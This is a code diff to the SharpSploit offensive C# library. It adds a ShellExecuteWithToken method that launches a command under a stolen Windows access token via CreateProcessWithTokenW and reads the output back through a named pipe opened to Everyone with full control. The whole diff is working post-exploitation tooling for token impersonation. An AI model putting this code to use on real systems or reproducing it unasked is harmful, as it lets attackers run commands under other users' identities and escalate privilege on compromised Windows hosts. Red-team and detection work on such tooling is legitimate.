@@ -8,6 +8,10 @@ using System.Reflection;
 using System.Diagnostics;
 using System.Management.Automation;
 using System.Text;
+using System.IO.Pipes;
+using System.Security.AccessControl;
+using System.IO;
+using System.Runtime.InteropServices;
 
 namespace SharpSploit.Execution
 {
@@ -142,6 +146,89 @@ namespace SharpSploit.Execution
             shellProcess.WaitForExit();
 
             return output.ToString().TrimEnd();
+        }
+
+        /// <summary>
+        /// Execute a given command with a stolen token.
+        /// </summary>
+        /// <param name="ShellCommand">The shell command to execute, including any arguments.</param>
+        /// <param name="Path">The path of the directory from which to execute the shell command.</param>
+        /// <param name="TokenHandle">A handle to the stolen token.</param>
+        /// <returns></returns>
+        public static string ShellExecuteWithToken(string ShellCommand, string Path, IntPtr TokenHandle)
+        {
+            if (ShellCommand == null || ShellCommand == "") return "";
+
+            string file = "";
+            string CommandLine = "";
+            if (ShellCommand.Contains(" "))
+            {
+                file = ShellCommand.Split(' ')[0];
+                CommandLine = ShellCommand;
+            }
+            else file = ShellCommand;
+            Win32.ProcessThreadsAPI._PROCESS_INFORMATION ProcInfo = 
+                new Win32.ProcessThreadsAPI._PROCESS_INFORMATION();
+            Win32.ProcessThreadsAPI._STARTUPINFO StartupInfo = 
+                new Win32.ProcessThreadsAPI._STARTUPINFO();
+
+            // Set ACL on named pipe to allow any user to access
+            PipeSecurity sec = new PipeSecurity();
+            sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
+
+            NamedPipeServerStream ServerStream = new NamedPipeServerStream(".pipe1badp1pe", PipeDirection.In, NamedPipeServerStream.MaxAllowedServerInstances,
+                PipeTransmissionMode.Message, PipeOptions.None, 4096, 4096, sec);
+            NamedPipeClientStream ClientStream = new NamedPipeClientStream(".", ".pipe1badp1pe", PipeDirection.Out, PipeOptions.None);
+
+            ClientStream.Connect();
+            ServerStream.WaitForConnection();
+            if (ServerStream.IsConnected)
+            {
+                StartupInfo.hStdOutput = ClientStream.SafePipeHandle.DangerousGetHandle();
+                StartupInfo.hStdInput = ClientStream.SafePipeHandle.DangerousGetHandle();
+            }
+
+            StartupInfo.wShowWindow = 0;
+            StartupInfo.dwFlags = (uint)Win32.ProcessThreadsAPI.STARTF.STARTF_USESTDHANDLES | (uint)Win32.ProcessThreadsAPI.STARTF.STARTF_USESHOWWINDOW;
+
+
+            bool CreateProcess = Win32.Advapi32.CreateProcessWithTokenW(
+                TokenHandle,                                // hToken
+                IntPtr.Zero,                                // dwLogonFlags
+                file,                                       // lpApplicationName
+                CommandLine,                                // lpCommandLine
+                (Win32.Advapi32.CREATION_FLAGS)IntPtr.Zero, // dwCreationFlags
+                IntPtr.Zero,                                // lpEnvironment
+                null,                                       // lpCurrentDirectory
+                ref StartupInfo,                            // lpStartupInfo
+                out ProcInfo);                              // lpProcessInfo
+            Debug.WriteLine(Marshal.GetLastWin32Error());
+
+            if (CreateProcess)
+            {
+                using (StreamReader reader = new StreamReader(ServerStream))
+                {
+                    try
+                    {
+                        Process NewProc = Process.GetProcessById((int)ProcInfo.dwProcessId);
+
+                        while (!NewProc.HasExited)
+                        {
+                            // Wait until exit
+                        }
+                    }
+                    catch
+                    {
+                        // Do nothing
+                    }
+
+                    ClientStream.Close();
+                    ClientStream.Dispose();
+
+                    return reader.ReadToEnd();
+                }
+            }
+            else return "";
         }
     }
 }
